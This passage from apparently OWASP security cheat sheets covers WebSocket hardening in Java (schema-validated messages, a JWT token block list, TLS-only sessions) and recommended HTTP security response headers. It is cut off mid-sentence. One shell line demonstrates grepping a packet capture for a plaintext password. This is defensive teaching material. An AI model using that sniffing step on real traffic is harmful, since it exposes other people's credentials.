endpoint strictly respect the expected structure and content.\r\n\r\n``` java\r\nimport com.fasterxml.jackson.databind.JsonNode;\r\nimport com.github.fge.jackson.JsonLoader;\r\nimport com.github.fge.jsonschema.core.exceptions.ProcessingException;\r\nimport com.github.fge.jsonschema.core.report.ProcessingReport;\r\nimport com.github.fge.jsonschema.main.JsonSchema;\r\nimport com.github.fge.jsonschema.main.JsonSchemaFactory;\r\nimport com.google.gson.Gson;\r\nimport org.owasp.pocwebsocket.vo.AuthenticationRequest;\r\n\r\nimport javax.websocket.DecodeException;\r\nimport javax.websocket.Decoder;\r\nimport javax.websocket.EndpointConfig;\r\nimport java.io.File;\r\nimport java.io.IOException;\r\n\r\n/**\r\n * Decode JSON text representation to an AuthenticationRequest object\r\n * <p>\r\n * As there's one instance of the decoder class by endpoint session so we can use the\r\n * JsonSchema as decoder instance variable.\r\n */\r\npublic class AuthenticationRequestDecoder implements Decoder.Text<AuthenticationRequest> {\r\n\r\n    /**\r\n     * JSON validation schema associated to this type of message\r\n     */\r\n    private JsonSchema validationSchema = null;\r\n\r\n    /**\r\n     * Initialize decoder and associated JSON validation schema\r\n     *\r\n     * @throws IOException If any error occur during the object creation\r\n     * @throws ProcessingException If any error occur during the schema loading\r\n     */\r\n    public AuthenticationRequestDecoder() throws IOException, ProcessingException {\r\n        JsonNode node = JsonLoader.fromFile(\r\n                        new File(\"src/main/resources/authentication-request-schema.json\"));\r\n        this.validationSchema = JsonSchemaFactory.byDefault().getJsonSchema(node);\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public AuthenticationRequest decode(String s) throws DecodeException {\r\n        try {\r\n            //Validate the provided representation against the dedicated schema\r\n            //Use validation mode with report in order to enable further inspection/tracing\r\n            //of the error details\r\n            //Moreover the validation method \"validInstance()\" generate a NullPointerException\r\n            //if the representation do not respect the expected schema\r\n            //so it's more proper to use the validation method with report\r\n            ProcessingReport validationReport = this.validationSchema.validate(JsonLoader.fromString(s),\r\n                                                                               true);\r\n            //Ensure there no error\r\n            if (!validationReport.isSuccess()) {\r\n                //Simply reject the message here: Don't care about error details...\r\n                throw new DecodeException(s, \"Validation of the provided representation failed !\");\r\n            }\r\n        } catch (IOException | ProcessingException e) {\r\n            throw new DecodeException(s, \"Cannot validate the provided representation to a\"\r\n                                      + \" JSON valid representation !\", e);\r\n        }\r\n\r\n        return new Gson().fromJson(s, AuthenticationRequest.class);\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public boolean willDecode(String s) {\r\n        boolean canDecode = false;\r\n\r\n        //If the provided JSON representation is empty/null then we indicate that\r\n        //representation cannot be decoded to our expected object\r\n        if (s == null || s.trim().isEmpty()) {\r\n            return canDecode;\r\n        }\r\n\r\n        //Try to cast the provided JSON representation to our object to validate at least\r\n        //the structure (content validation is done during decoding)\r\n        try {\r\n            AuthenticationRequest test = new Gson().fromJson(s, AuthenticationRequest.class);\r\n            canDecode = (test != null);\r\n        } catch (Exception e) {\r\n            //Ignore explicitly any casting error...\r\n        }\r\n\r\n        return canDecode;\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public void init(EndpointConfig config) {\r\n        //Not used\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public void destroy() {\r\n        //Not used\r\n    }\r\n}\r\n```\r\n\r\n``` java\r\nimport com.fasterxml.jackson.databind.JsonNode;\r\nimport com.github.fge.jackson.JsonLoader;\r\nimport com.github.fge.jsonschema.core.exceptions.ProcessingException;\r\nimport com.github.fge.jsonschema.core.report.ProcessingReport;\r\nimport com.github.fge.jsonschema.main.JsonSchema;\r\nimport com.github.fge.jsonschema.main.JsonSchemaFactory;\r\nimport com.google.gson.Gson;\r\nimport org.owasp.pocwebsocket.vo.AuthenticationResponse;\r\n\r\nimport javax.websocket.EncodeException;\r\nimport javax.websocket.Encoder;\r\nimport javax.websocket.EndpointConfig;\r\nimport java.io.File;\r\nimport java.io.IOException;\r\n\r\n/**\r\n * Encode AuthenticationResponse object to JSON text representation.\r\n * <p>\r\n * As there one instance of the encoder class by endpoint session so we can use\r\n * the JsonSchema as encoder instance variable.\r\n */\r\npublic class AuthenticationResponseEncoder implements Encoder.Text<AuthenticationResponse> {\r\n\r\n    /**\r\n     * JSON validation schema associated to this type of message\r\n     */\r\n    private JsonSchema validationSchema = null;\r\n\r\n    /**\r\n     * Initialize encoder and associated JSON validation schema\r\n     *\r\n     * @throws IOException If any error occur during the object creation\r\n     * @throws ProcessingException If any error occur during the schema loading\r\n     */\r\n    public AuthenticationResponseEncoder() throws IOException, ProcessingException {\r\n        JsonNode node = JsonLoader.fromFile(\r\n                        new File(\"src/main/resources/authentication-response-schema.json\"));\r\n        this.validationSchema = JsonSchemaFactory.byDefault().getJsonSchema(node);\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public String encode(AuthenticationResponse object) throws EncodeException {\r\n        //Generate the JSON representation\r\n        String json = new Gson().toJson(object);\r\n        try {\r\n            //Validate the generated representation against the dedicated schema\r\n            //Use validation mode with report in order to enable further inspection/tracing\r\n            //of the error details\r\n            //Moreover the validation method \"validInstance()\" generate a NullPointerException\r\n            //if the representation do not respect the expected schema\r\n            //so it's more proper to use the validation method with report\r\n            ProcessingReport validationReport = this.validationSchema.validate(JsonLoader.fromString(json),\r\n                                                                                true);\r\n            //Ensure there no error\r\n            if (!validationReport.isSuccess()) {\r\n                //Simply reject the message here: Don't care about error details...\r\n                throw new EncodeException(object, \"Validation of the generated representation failed !\");\r\n            }\r\n        } catch (IOException | ProcessingException e) {\r\n            throw new EncodeException(object, \"Cannot validate the generated representation to a\"+\r\n                                              \" JSON valid representation !\", e);\r\n        }\r\n\r\n        return json;\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public void init(EndpointConfig config) {\r\n        //Not used\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public void destroy() {\r\n        //Not used\r\n    }\r\n\r\n}\r\n```\r\n\r\nNote that the same approach is used in the messages handling part of the POC. All messages exchanged between the client and the server are systematically validated using the same way, using dedicated JSON schemas linked to messages dedicated Encoder/Decoder (serialization/deserialization).\r\n\r\n### Authorization and access token explicit invalidation\r\n\r\nAuthorization information is stored in the access token using the JWT *Claim* feature (in the POC the name of the claim is *access_level*). Authorization is validated when a request is received and before any other action using the user input information.\r\n\r\nThe access token is passed with every message sent to the message endpoint and a block list is used in order to allow the user to request an explicit token invalidation.\r\n\r\nExplicit token invalidation is interesting from a user's point of view because, often when tokens are used, the validity timeframe of the token is relatively long (it's common to see a valid timeframe superior to 1 hour) so it's important to allow a user to have a way to indicate to the system \"OK, I have finished my exchange with you, so you can close our exchange session and cleanup associated links\".\r\n\r\nIt also helps the user to revoke itself of current access if a malicious concurrent access is detected using the same token (case of token stealing).\r\n\r\n**Token block list** - Maintain a temporary list using memory and time limited Caching of hashes of token that are not allowed to be used anymore\r\n\r\n``` java\r\nimport org.apache.commons.jcs.JCS;\r\nimport org.apache.commons.jcs.access.CacheAccess;\r\nimport org.apache.commons.jcs.access.exception.CacheException;\r\n\r\nimport javax.xml.bind.DatatypeConverter;\r\nimport java.security.MessageDigest;\r\nimport java.security.NoSuchAlgorithmException;\r\n\r\n/**\r\n * Utility class to manage the access token that have been declared as no\r\n * more usable (explicit user logout)\r\n */\r\npublic class AccessTokenBlocklistUtils {\r\n    /**\r\n     * Message content send by user that indicate that the access token that\r\n     * come along the message must be block-listed for further usage\r\n     */\r\n    public static final String MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG = \"INVALIDATE_TOKEN\";\r\n\r\n    /**\r\n     * Use cache to store block-listed token hash in order to avoid memory exhaustion and be consistent\r\n     * because token are valid 30 minutes so the item live in cache 60 minutes\r\n     */\r\n    private static final CacheAccess<String, String> TOKEN_CACHE;\r\n\r\n    static {\r\n        try {\r\n            TOKEN_CACHE = JCS.getInstance(\"default\");\r\n        } catch (CacheException e) {\r\n            throw new RuntimeException(\"Cannot init token cache !\", e);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Add token into the block list\r\n     *\r\n     * @param token Token for which the hash must be added\r\n     * @throws NoSuchAlgorithmException If SHA256 is not available\r\n     */\r\n    public static void addToken(String token) throws NoSuchAlgorithmException {\r\n        if (token != null && !token.trim().isEmpty()) {\r\n            String hashHex = computeHash(token);\r\n            if (TOKEN_CACHE.get(hashHex) == null) {\r\n                TOKEN_CACHE.putSafe(hashHex, hashHex);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Check if a token is present in the block list\r\n     *\r\n     * @param token Token for which the presence of the hash must be verified\r\n     * @return TRUE if token is block-listed\r\n     * @throws NoSuchAlgorithmException If SHA256 is not available\r\n     */\r\n    public static boolean isBlocklisted(String token) throws NoSuchAlgorithmException {\r\n        boolean exists = false;\r\n        if (token != null && !token.trim().isEmpty()) {\r\n            String hashHex = computeHash(token);\r\n            exists = (TOKEN_CACHE.get(hashHex) != null);\r\n        }\r\n        return exists;\r\n    }\r\n\r\n    /**\r\n     * Compute the SHA256 hash of a token\r\n     *\r\n     * @param token Token for which the hash must be computed\r\n     * @return The hash encoded in HEX\r\n     * @throws NoSuchAlgorithmException If SHA256 is not available\r\n     */\r\n    private static String computeHash(String token) throws NoSuchAlgorithmException {\r\n        String hashHex = null;\r\n        if (token != null && !token.trim().isEmpty()) {\r\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\r\n            byte[] hash = md.digest(token.getBytes());\r\n            hashHex = DatatypeConverter.printHexBinary(hash);\r\n        }\r\n        return hashHex;\r\n    }\r\n\r\n}\r\n```\r\n\r\n**Message handling** - Process a request from a user to add a message in the list. Show a authorization validation approach example\r\n\r\n``` java\r\nimport com.auth0.jwt.interfaces.Claim;\r\nimport com.auth0.jwt.interfaces.DecodedJWT;\r\nimport org.owasp.pocwebsocket.enumeration.AccessLevel;\r\nimport org.owasp.pocwebsocket.util.AccessTokenBlocklistUtils;\r\nimport org.owasp.pocwebsocket.util.AuthenticationUtils;\r\nimport org.owasp.pocwebsocket.util.MessageUtils;\r\nimport org.owasp.pocwebsocket.vo.MessageRequest;\r\nimport org.owasp.pocwebsocket.vo.MessageResponse;\r\nimport org.slf4j.Logger;\r\nimport org.slf4j.LoggerFactory;\r\n\r\nimport javax.websocket.EncodeException;\r\nimport javax.websocket.RemoteEndpoint;\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\n/**\r\n * Handle message flow\r\n */\r\npublic class MessageHandler implements javax.websocket.MessageHandler.Whole<MessageRequest> {\r\n\r\n    private static final Logger LOG = LoggerFactory.getLogger(MessageHandler.class);\r\n\r\n    /**\r\n     * Reference to the communication channel with the client\r\n     */\r\n    private RemoteEndpoint.Basic clientConnection;\r\n\r\n    /**\r\n     * Constructor\r\n     *\r\n     * @param clientConnection Reference to the communication channel with the client\r\n     */\r\n    public MessageHandler(RemoteEndpoint.Basic clientConnection) {\r\n        this.clientConnection = clientConnection;\r\n    }\r\n\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public void onMessage(MessageRequest message) {\r\n        MessageResponse response = null;\r\n        try {\r\n            /*Step 1: Verify the token*/\r\n            String token = message.getToken();\r\n            //Verify if is it in the block list\r\n            if (AccessTokenBlocklistUtils.isBlocklisted(token)) {\r\n                throw new IllegalAccessException(\"Token is in the block list !\");\r\n            }\r\n\r\n            //Verify the signature of the token\r\n            DecodedJWT decodedToken = AuthenticationUtils.validateToken(token);\r\n\r\n            /*Step 2: Verify the authorization (access level)*/\r\n            Claim accessLevel = decodedToken.getClaim(\"access_level\");\r\n            if (accessLevel == null || AccessLevel.valueOf(accessLevel.asString()) == null) {\r\n                throw new IllegalAccessException(\"Token have an invalid access level claim !\");\r\n            }\r\n\r\n            /*Step 3: Do the expected processing*/\r\n            //Init the list of the messages for the current user\r\n            if (!MessageUtils.MESSAGES_DB.containsKey(decodedToken.getSubject())) {\r\n                MessageUtils.MESSAGES_DB.put(decodedToken.getSubject(), new ArrayList<>());\r\n            }\r\n\r\n            //Add message to the list of message of the user if the message is a not a token invalidation\r\n            //order otherwise add the token to the block list\r\n            if (AccessTokenBlocklistUtils.MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG\r\n                .equalsIgnoreCase(message.getContent().trim())) {\r\n                AccessTokenBlocklistUtils.addToken(message.getToken());\r\n            } else {\r\n                MessageUtils.MESSAGES_DB.get(decodedToken.getSubject()).add(message.getContent());\r\n            }\r\n\r\n            //According to the access level of user either return only is message or return all message\r\n            List<String> messages = new ArrayList<>();\r\n            if (accessLevel.asString().equals(AccessLevel.USER.name())) {\r\n                MessageUtils.MESSAGES_DB.get(decodedToken.getSubject())\r\n                .forEach(s -> messages.add(String.format(\"(%s): %s\", decodedToken.getSubject(), s)));\r\n            } else if (accessLevel.asString().equals(AccessLevel.ADMIN.name())) {\r\n                MessageUtils.MESSAGES_DB.forEach((k, v) ->\r\n                v.forEach(s -> messages.add(String.format(\"(%s): %s\", k, s))));\r\n            }\r\n\r\n            //Build the response object indicating that exchange succeed\r\n            if (AccessTokenBlocklistUtils.MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG\r\n                .equalsIgnoreCase(message.getContent().trim())) {\r\n                response = new MessageResponse(true, messages, \"Token added to the block list\");\r\n            }else{\r\n                response = new MessageResponse(true, messages, \"\");\r\n            }\r\n\r\n        } catch (Exception e) {\r\n            LOG.error(\"[MessageHandler] Error occur in exchange process.\", e);\r\n            //Build the response object indicating that exchange fail\r\n            //We send the error detail on client because ware are in POC (it will not the case in a real app)\r\n            response = new MessageResponse(false, new ArrayList<>(), \"Error occur during exchange: \"\r\n                       + e.getMessage());\r\n        } finally {\r\n            //Send response\r\n            try {\r\n                this.clientConnection.sendObject(response);\r\n            } catch (IOException | EncodeException e) {\r\n                LOG.error(\"[MessageHandler] Error occur in response object sending.\", e);\r\n            }\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### Confidentiality and Integrity\r\n\r\nIf the raw version of the protocol is used (protocol `ws://`) then the transferred data is exposed to eavesdropping and potential on-the-fly alteration.\r\n\r\nExample of capture using [Wireshark](https://www.wireshark.org/) and searching for password exchanges in the stored PCAP file, not printable characters has been explicitly removed from the command result:\r\n\r\n``` shell\r\n$ grep -aE '(password)' capture.pcap\r\n{\"login\":\"bob\",\"password\":\"bob123\"}\r\n```\r\n\r\nThere is a way to check, at WebSocket endpoint level, if the channel is secure by calling the method `isSecure()` on the *session* object instance.\r\n\r\nExample of implementation in the method of the endpoint in charge of setup of the session and affects the message handler:\r\n\r\n``` java\r\n/**\r\n * Handle the beginning of an exchange\r\n *\r\n * @param session Exchange session information\r\n */\r\n@OnOpen\r\npublic void start(Session session) {\r\n    ...\r\n    //Affect a new message handler instance in order to process the exchange only if the channel is secured\r\n    if(session.isSecure()) {\r\n        session.addMessageHandler(new AuthenticationMessageHandler(session.getBasicRemote()));\r\n    }else{\r\n        LOG.info(\"[AuthenticationEndpoint] Session {} do not use a secure channel so no message handler \" +\r\n                 \"was affected for processing and session was explicitly closed !\", session.getId());\r\n        try{\r\n            session.close(new CloseReason(CloseReason.CloseCodes.CANNOT_ACCEPT,\"Insecure channel used !\"));\r\n        }catch(IOException e){\r\n            LOG.error(\"[AuthenticationEndpoint] Session {} cannot be explicitly closed !\", session.getId(),\r\n                      e);\r\n        }\r\n\r\n    }\r\n    LOG.info(\"[AuthenticationEndpoint] Session {} message handler affected for processing\", session.getId());\r\n}\r\n```\r\n\r\nExpose WebSocket endpoints only on [wss://](https://kaazing.com/html5-websocket-security-is-strong/) protocol (WebSockets over SSL/TLS) in order to ensure *Confidentiality* and *Integrity* of the traffic like using HTTP over SSL/TLS to secure HTTP exchanges.\r\n"
    },
    {
      "HTTP_Headers_Cheat_Sheet.md": "# HTTP Security Response Headers Cheat Sheet\r\n\r\n## Introduction\r\n\r\nHTTP Headers are a great booster for web security with easy implementation. Proper HTTP response headers can help prevent security vulnerabilities like Cross-Site Scripting, Clickjacking, Information disclosure and more.\r\n\r\nIn this cheat sheet, we will review all security-related HTTP headers, recommended configurations, and reference other sources for complicated headers.\r\n\r\n## Security Headers\r\n\r\n### X-Frame-Options\r\n\r\nThe `X-Frame-Options` HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>`, `<iframe>`, `<embed>` or `<object>`. Sites can use this to avoid [clickjacking](https://owasp.org/www-community/attacks/Clickjacking) attacks, by ensuring that their content is not embedded into other sites.\r\n\r\nContent Security Policy (CSP) frame-ancestors directive obsoletes X-Frame-Options for supporting browsers ([source](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)).\r\n\r\nX-Frame-Options header is only useful when the HTTP response where it is included has something to interact with (e.g. links, buttons). If the HTTP response is a redirect or an API returning JSON data, X-Frame-Options does not provide any security.\r\n\r\n#### Recommendation\r\n\r\nUse Content Security Policy (CSP) frame-ancestors directive if possible.\r\n\r\nDo not allow displaying of the page in a frame.\r\n> `X-Frame-Options: DENY`\r\n\r\n### X-XSS-Protection\r\n\r\nThe HTTP `X-XSS-Protection` response header is a feature of Internet Explorer, Chrome, and Safari that stops pages from loading when they detect reflected cross-site scripting (XSS) attacks.\r\n\r\nWARNING: Even though this header can protect users of older web browsers that don't yet support CSP, in some cases, this header can create XSS vulnerabilities in otherwise safe websites [source](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection).\r\n\r\n#### Recommendation\r\n\r\nUse a Content Security Policy (CSP) that disables the use of inline JavaScript.\r\n\r\nDo not set this header or explicitly turn it off.\r\n> `X-XSS-Protection: 0`\r\n\r\nPlease see [Mozilla X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection) for details.\r\n\r\n### X-Content-Type-Options\r\n\r\nThe `X-Content-Type-Options` response HTTP header is used by the server to indicate to the browsers that the MIME types advertised in the Content-Type headers should be followed and not guessed.\r\n\r\nThis header is used to block browsers' [MIME type sniffing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#mime_sniffing), which can transform non-executable MIME types into executable MIME types ([MIME Confusion Attacks](https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/)).\r\n\r\n#### Recommendation\r\n\r\nSet the Content-Type header correctly throughout the site.\r\n\r\n> `X-Content-Type-Options: nosniff`\r\n\r\n### Referrer-Policy\r\n\r\nThe `Referrer-Policy` HTTP header controls how much referrer information (sent via the Referer header) should be included with requests.\r\n\r\n#### Recommendation\r\n\r\nReferrer policy has been supported by browsers since 2014. Today, the default behavior in modern browsers is to no longer send all referrer information (origin, path, and query string) to the same site but to only send the origin to other sites. However, since not all users may be using the latest browsers we suggest forcing this behavior by sending this header on all responses.\r\n\r\n> `Referrer-Policy: strict-origin-when-cross-origin`\r\n\r\n- *NOTE:* For more information on configuring this header please see [Mozilla Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy).\r\n\r\n### Content-Type\r\n\r\nThe `Content-Type` representation header is used to indicate the original media type of the resource (before any content encoding is applied for sending). If not set correctly, the resource (e.g. an image) may be interpreted as HTML, making XSS vulnerabilities possible.\r\n\r\nAlthough it is recommended to always set the `Content-Type` header correctly, it would constitute a vulnerability only if the content is intended to be rendered by the client and the resource is untrusted (provided or modified by a user).\r\n\r\n#### Recommendation\r\n\r\n> `Content-Type: text/html; charset=UTF-8`\r\n\r\n- *NOTE:* the `charset` attribute is necessary to prevent XSS in **HTML** pages\r\n- *NOTE*: the `text/html` can be any of the possible [MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types)\r\n\r\n### Set-Cookie\r\n\r\nThe `Set-Cookie` HTTP response header is used to send a cookie from the server to the user agent, so the user agent can send it back to the server later. To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.\r\n\r\nThis is not a security header per se, but its security attributes are crucial.\r\n\r\n#### Recommendation\r\n\r\n- Please read [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies) for a detailed explanation on cookie configuration options.\r\n\r\n### Strict-Transport-Security (HSTS)\r\n\r\nThe HTTP `Strict-Transport-Security` response header (often abbreviated as HSTS) lets a website tell browsers that it should only be accessed using HTTPS, instead of using HTTP.\r\n\r\n#### Recommendation\r\n\r\n> `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`\r\n\r\n- *NOTE*: Read carefully how this header works before using it. If the HSTS header is misconfigured or if there is a problem with the SSL/TLS certificate being used, legitimate users might be unable to access the website. For example, if the HSTS header is set to a very long duration and the SSL/TLS certificate expires or is revoked, legitimate users might be unable to access the website until the HSTS header duration has expired.\r\n\r\nPlease checkout [HTTP Strict Transport Security Cheat Sheet](HTTP_Strict_Transport_Security_Cheat_Sheet.md) for more information.\r\n\r\n### Expect-CT ❌\r\n\r\nThe `Expect-CT` header lets sites opt-in to reporting of Certificate Transparency (CT) requirements. Given that mainstream clients now require CT qualification, the only remaining value is reporting such occurrences to the nominated report-uri value in the header. The header is now less about enforcement and more about detection/reporting.\r\n\r\n#### Recommendation\r\n\r\nDo not use it. Mozilla [recommends](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT) avoiding it, and removing it from existing code if possible.\r\n\r\n### Content-Security-Policy (CSP)\r\n\r\nContent Security Policy (CSP) is a security feature that is used to specify the origin of content that is allowed to be loaded on a website or in a web applications. It is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement to distribution of malware.\r\n\r\n- *NOTE*: This header is relevant to be applied in pages which can load and interpret scripts and code, but might be meaningless in the response of a REST API that returns content that is not going to be rendered.\r\n\r\n#### Recommendation\r\n\r\nContent Security Policy is complex to configure and maintain. For an explanation on customization options, please read [Content Security Policy Cheat Sheet](Content_Security_Policy_Cheat_Sheet.md)\r\n\r\n### Access-Control-Allow-Origin\r\n\r\nIf you don't use this header, your site is protected by default by the Same Origin Policy (SOP). What this header does is relax this control in specified circumstances.\r\n\r\nThe `Access-Control-Allow-Origin` is a CORS (cross-origin resource sharing) header. This header indicates whether the response it is related to can be shared with requesting code from the given origin. In other words, if siteA requests a resource from siteB, siteB should indicate in its `Access-Control-Allow-Origin` header that siteA is allowed to fetch that resource, if not, the access is blocked due to Same Origin Policy (SOP).\r\n\r\n#### Recommendation\r\n\r\nIf you use it, set specific [origins](https://developer.mozilla.org/en-US/docs/Glossary/Origin) instead of `*`. Checkout [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) for details.\r\n> `Access-Control-Allow-Origin: https://yoursite.com`\r\n\r\n- *NOTE*: The use '*' might be necessary depending on your needs. For example, for a public API that should be accessible from any origin, it might be necessary to allow '*'.\r\n\r\n### Cross-Origin-Opener-Policy (COOP)\r\n\r\nThe HTTP `Cross-Origin-Opener-Policy` (COOP) response header allows you to ensure a top-level document does not share a browsing context group with cross-origin documents.\r\n\r\nThis header works together with Cross-Origin-Embedder-Policy (COEP) and Cross-Origin-Resource-Policy (CORP) explained below.\r\n\r\nThis mechanism protects against attacks like Spectre which can cross the security boundary established by Same Origin Policy (SOP) for resources in the same browsing context group.\r\n\r\nAs this headers are very related to browsers, it may not make sense to be applied to REST APIs or clients that are not browsers.\r\n\r\n#### Recommendation\r\n\r\nIsolates the browsing context exclusively to same-origin documents.\r\n> `HTTP Cross-Origin-Opener-Policy: same-origin`\r\n\r\n### Cross-Origin-Embedder-Policy (COEP)\r\n\r\nThe HTTP `Cross-Origin-Embedder-Policy` (COEP) response header prevents a document from loading any cross-origin resources that don't explicitly grant the document permission (using [CORP](#cross-origin-resource-policy) or CORS).\r\n\r\n- *NOTE*: Enabling this will block cross-origin resources not configured correctly from loading.\r\n\r\n#### Recommendation\r\n\r\nA document can only load resources from the same origin, or resources explicitly marked as loadable from another origin.\r\n> `Cross-Origin-Embedder-Policy: require-corp`\r\n\r\n- *NOTE*: you can bypass it for specific resources by adding the `crossorigin` attribute:\r\n- `<img src=\"https://thirdparty.com/img.png\" crossorigin>`\r\n\r\n### Cross-Origin-Resource-Policy (CORP)\r\n\r\nThe `Cross-Origin-Resource-Policy` (CORP) header allows you to control the set of origins that are empowered to include a resource. It is a robust defense against attacks like [Spectre](https://meltdownattack.com/), as it allows browsers to block a given response before it enters an attacker's process.\r\n\r\n#### Recommendation\r\n\r\nLimit current resource loading to the site and sub-domains only.\r\n> `Cross-Origin-Resource-Policy: same-site`\r\n\r\n### Permissions-Policy (formerly Feature-Policy)\r\n\r\nPermissions-Policy allows you to control which origins can use which browser features, both in the top-level page and in embedded frames. For every feature controlled by Feature Policy, the feature is only enabled in the current document or frame if its origin matches the allowed list of origins. This means that you can configure your site to never allow the camera or microphone to be activated. This prevents that an injection, for example an XSS, enables the camera, the microphone, or other browser feature.\r\n\r\nMore information: [Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy)\r\n\r\n#### Recommendation\r\n\r\nSet it and disable all the features that your site does not need or allow them only to the authorized domains:\r\n> `Permissions-Policy: geolocation=(), camera=(), microphone=()`\r\n\r\n- *NOTE*: This example is disabling geolocation, camera, and microphone for all domains.\r\n\r\n### FLoC (Federated Learning of Cohorts)\r\n\r\nFLoC is a method proposed by Google in 2021 to deliver interest-based advertisements to groups of users (\"cohorts\"). The [Electronic Frontier Foundation](https://www.eff.org/deeplinks/2021/03/googles-floc-terrible-idea), [Mozilla](https://blog.mozilla.org/en/privacy-security/privacy-analysis-of-floc/), and others believe FLoC does not do enough to protect users' privacy.\r\n\r\n#### Recommendation\r\n\r\nA site can declare that it does not want to be included in the user's list of sites for cohort calculation by sending this HTTP header.\r\n> Permissions-Policy: interest-cohort=()\r\n\r\n### Server\r\n\r\nThe `Server` header describes the software used by the origin server that handled the request — that is, the server that generated the response.\r\n\r\nThis is not a security header, but how it is used is relevant for security.\r\n\r\n#### Recommendation\r\n\r\nRemove this header or set non-informative values.\r\n> `Server: webserver`\r\n\r\n- *NOTE*: Remember that attackers have other means of fingerprinting the server technology.\r\n\r\n### X-Powered-By\r\n\r\nThe `X-Powered-By` header describes the technologies used by the webserver. This information exposes the server to attackers. Using the information in this header, attackers can find vulnerabilities easier.\r\n\r\n#### Recommendation\r\n\r\nRemove all `X-Powered-By` headers.\r\n\r\n- *NOTE*: Remember that attackers have other means of fingerprinting your tech stack.\r\n\r\n### X-AspNet-Version\r\n\r\nProvides information about the .NET version.\r\n\r\n#### Recommendation\r\n\r\nDisable sending this header. Add the following line in your `web.config` in the `<system.web>` section to remove it.\r\n\r\n```xml\r\n<httpRuntime enableVersionHeader=\"false\" />\r\n```\r\n\r\n- *NOTE*: Remember that attackers have other means of fingerprinting your tech stack.\r\n\r\n### X-AspNetMvc-Version\r\n\r\nProvides information about the .NET version.\r\n\r\n#### Recommendation\r\n\r\nDisable sending this header. To remove the `X-AspNetMvc-Version` header, add the below line in `Global.asax` file.\r\n\r\n```lang-none\r\nMvcHandler.DisableMvcResponseHeader = true;\r\n```\r\n\r\n- *NOTE*: Remember that attackers have other means of fingerprinting your tech stack.\r\n\r\n### X-DNS-Prefetch-Control\r\n\r\nThe `X-DNS-Prefetch-Control` HTTP response header controls DNS prefetching, a feature by which browsers proactively perform domain name resolution on both links that the user may choose to follow as well as URLs for items referenced by the document, including images, CSS, JavaScript, and so forth.\r\n\r\n#### Recommendation\r\n\r\nThe default behavior of browsers is to perform DNS caching which is good for most websites.\r\nIf you do not control links on your website, you might want to set `off` as a value to disable DNS prefetch to avoid leaking information to those domains.\r\n\r\n> `X-DNS-Prefetch-Control: off`\r\n\r\n- *NOTE*: Do not rely in this functionality for anything production sensitive: it is not standard or fully supported and implementation may vary among browsers.\r\n\r\n### Public-Key-Pins (HPKP)\r\n\r\nThe HTTP `Public-Key-Pins` response header is used to associate a specific cryptographic public key with a certain web server to decrease the risk of MITM attacks with forged certificates.\r\n\r\n#### Recommendation\r\n\r\nThis header is deprecated and should not be used anymore.\r\n\r\n## Adding HTTP Headers in Different Technologies\r\n\r\n### PHP\r\n\r\nThe sample code below sets the `X-Frame-Options` header in PHP.\r\n\r\n```php\r\nheader(\"X-Frame-Options: DENY\");\r\n```\r\n\r\n### Apache\r\n\r\nBelow is an `.htaccess` sample configuration which sets the `X-Frame-Options` header in Apache.\r\n\r\n```lang-bsh\r\n<IfModule mod_headers.c>\r\nHeader set X-Frame-Options \"DENY\"\r\n</IfModule>\r\n```\r\n\r\n### IIS\r\n\r\nAdd configurations below to your `Web.config` in IIS to send the `X-Frame-Options` header.\r\n\r\n```xml\r\n<system.webServer>\r\n...\r\n <httpProtocol>\r\n   <customHeaders>\r\n     <add name=\"X-Frame-Options\" value=\"DENY\" />\r\n   </customHeaders>\r\n </httpProtocol>\r\n...\r\n</system.webServer>\r\n```\r\n\r\n### HAProxy\r\n\r\nAdd the line below to your front-end, listen, or backend configurations to send the `X-Frame-Options` header.\r\n\r\n```lang-none\r\nhttp-response set-header X-Frame-Options DENY\r\n```\r\n\r\n### Nginx\r\n\r\nBelow is a sample configuration, it sets the `X-Frame-Options` header in Nginx.\r\n\r\n```lang-none\r\nadd_header \"X-Frame-Options\" \"DENY\";\r\n```\r\n\r\n### Express\r\n\r\nYou can use [helmet](https://www.npmjs.com/package/helmet) to setup HTTP headers in Express. The code below is sample for adding the `X-Frame-Options` 